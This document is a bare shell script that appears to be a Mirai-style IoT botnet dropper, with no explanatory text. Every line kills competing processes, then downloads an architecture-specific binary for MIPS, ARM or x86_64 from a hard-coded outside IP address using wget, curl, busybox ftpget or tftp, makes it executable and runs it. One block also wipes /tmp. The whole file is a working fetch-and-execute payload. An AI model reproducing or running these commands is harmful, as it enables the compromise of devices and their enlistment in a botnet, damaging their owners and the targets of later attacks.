  
killall -9 mips; killall -9 mips.s; cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://178.16.52.10/mips; chmod +x mips; ./mips ama
killall -9 mpsl; killall -9 mpsl.s; cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://178.16.52.10/mpsl; chmod +x mpsl; ./mpsl ama
killall -9 x86_64; killall -9 x86_64.s; cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://178.16.52.10/x86_64; chmod +x x86_64; ./x86_64 ama
killall -9 arm4; killall -9 arm4.s; cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://178.16.52.10/arm4; chmod +x arm4; ./arm4 ama
killall -9 arm5; killall -9 arm5.s; cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://178.16.52.10/arm5; chmod +x arm5; ./arm5 ama
killall -9 arm6; killall -9 arm6.s; cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://178.16.52.10/arm6; chmod +x arm6; ./arm6 ama
killall -9 arm7; killall -9 arm7.s; cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://178.16.52.10/arm7; chmod +x arm7; ./arm7 ama

cd /tmp; rm -rf *;
/bin/busybox ftpget/178.16.52.10 -P 8021 mips mips; chmod 777 mips; ./mips ama
/bin/busybox ftpget/178.16.52.10 -P 8021 mpsl mpsl; chmod 777 mpsl; ./mips ama
/bin/busybox ftpget/178.16.52.10 -P 8021 x86_64 x86_64; chmod 777 x86_64; ./x86_64 ama
/bin/busybox ftpget/178.16.52.10 -P 8021 arm4 arm4; chmod 777 arm4; ./arm4 ama
/bin/busybox ftpget/178.16.52.10 -P 8021 arm5 arm5; chmod 777 arm5; ./arm5 ama
/bin/busybox ftpget/178.16.52.10 -P 8021 arm5 arm6; chmod 777 arm6; ./arm6 ama
/bin/busybox ftpget/178.16.52.10 -P 8021 arm7 arm7; chmod 777 arm7; ./arm7 ama

killall -9 mips; killall -9 mips.s;  wget http://178.16.52.10/mips; chmod +x mips; ./mips ama
killall -9 mpsl; killall -9 mpsl.s;  wget http://178.16.52.10/mpsl; chmod +x mpsl; ./mpsl ama
killall -9 x86_64; killall -9 x86_64.s;  wget http://178.16.52.10/x86_64; chmod +x x86_64; ./x86_64 ama
killall -9 arm4; killall -9 arm4.s;  wget http://178.16.52.10/arm4; chmod +x arm4; ./arm4 ama
killall -9 arm5; killall -9 arm5.s;  wget http://178.16.52.10/arm5; chmod +x arm5; ./arm5 ama
killall -9 arm6; killall -9 arm6.s;  wget http://178.16.52.10/arm6; chmod +x arm6; ./arm6 ama
killall -9 arm7; killall -9 arm7.s;  wget http://178.16.52.10/arm7; chmod +x arm7; ./arm7 ama

killall -9 mips; killall -9 mips.s;  curl -O http://178.16.52.10/mips; chmod +x mips; ./mips ama
killall -9 mpsl; killall -9 mpsl.s;  curl -O http://178.16.52.10/mpsl; chmod +x mpsl; ./mpsl ama
killall -9 x86_64; killall -9 x86_64.s;  curl -O http://178.16.52.10/x86_64; chmod +x x86_64; ./x86_64 ama
killall -9 arm4; killall -9 arm4.s;  curl -O http://178.16.52.10/arm4; chmod +x arm4; ./arm4 ama
killall -9 arm5; killall -9 arm5.s;  curl -O http://178.16.52.10/arm5; chmod +x arm5; ./arm5 ama
killall -9 arm6; killall -9 arm6.s;  curl -O http://178.16.52.10/arm6; chmod +x arm6; ./arm6 ama
killall -9 arm7; killall -9 arm7.s;  curl -O http://178.16.52.10/arm7; chmod +x arm7; ./arm7 ama

ftpget/178.16.52.10 -P 8021 mips mips; chmod 777 mips; ./mips ama
ftpget/178.16.52.10 -P 8021 mpsl mpsl; chmod 777 mpsl; ./mpsl ama
ftpget/178.16.52.10 -P 8021 x86_64 x86_64; chmod 777 x86_64; ./x86_64 ama
ftpget/178.16.52.10 -P 8021 arm4 arm4; chmod 777 arm4; ./arm4 ama
ftpget/178.16.52.10 -P 8021 arm5 arm5; chmod 777 arm5; ./arm5 ama
ftpget/178.16.52.10 -P 8021 arm6 arm6; chmod 777 arm6; ./arm6 ama
ftpget/178.16.52.10 -P 8021 arm7 arm7; chmod 777 arm7; ./arm7 ama

/bin/busybox tftp -g -r mips/178.16.52.10 69; chmod 777 mips; ./mips ama
/bin/busybox tftp -g -r mpsl/178.16.52.10 69; chmod 777 mpsl; ./mpsl ama
/bin/busybox tftp -g -r x86_64/178.16.52.10 69; chmod 777 x86_64; ./x86_64 ama
/bin/busybox tftp -g -r arm4/178.16.52.10 69; chmod 777 arm4; ./arm4 ama
/bin/busybox tftp -g -r arm5/178.16.52.10 69; chmod 777 arm5; ./arm5 ama
/bin/busybox tftp -g -r arm6/178.16.52.10 69; chmod 777 arm6; ./arm6 ama
/bin/busybox tftp -g -r arm7/178.16.52.10 69; chmod 777 arm7; ./arm7 ama

tftp -g -r mips/178.16.52.10 69; chmod 777 mips; ./mips ama
tftp -g -r mpsl/178.16.52.10 69; chmod 777 mpsl; ./mpsl ama
tftp -g -r x86_64/178.16.52.10 69; chmod 777 x86_64; ./x86_64 ama
tftp -g -r arm4/178.16.52.10 69; chmod 777 arm4; ./arm4 ama
tftp -g -r arm5/178.16.52.10 69; chmod 777 arm5; ./arm5 ama
tftp -g -r arm6/178.16.52.10 69; chmod 777 arm6; ./arm6 ama
tftp -g -r arm7/178.16.52.10 69; chmod 777 arm7; ./arm7 ama

        
